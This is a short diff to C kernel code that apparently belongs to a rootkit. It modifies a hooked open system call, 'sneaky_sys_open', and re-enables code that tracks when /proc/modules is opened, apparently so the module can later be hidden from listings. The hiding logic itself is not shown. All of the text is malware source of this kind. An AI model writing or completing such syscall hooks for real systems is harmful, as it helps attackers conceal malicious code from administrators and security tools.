@@ -124,9 +124,9 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
     fd = original_call(pathname, flags);
   } else {
     fd = original_call(pathname, flags);
-    /*if (strcmp(pathname, "/proc/modules") == 0) {
+    if (strcmp(pathname, "/proc/modules") == 0) {
       module_pointer = fd;
-      }*/
+    }
   }
   return fd;
 }
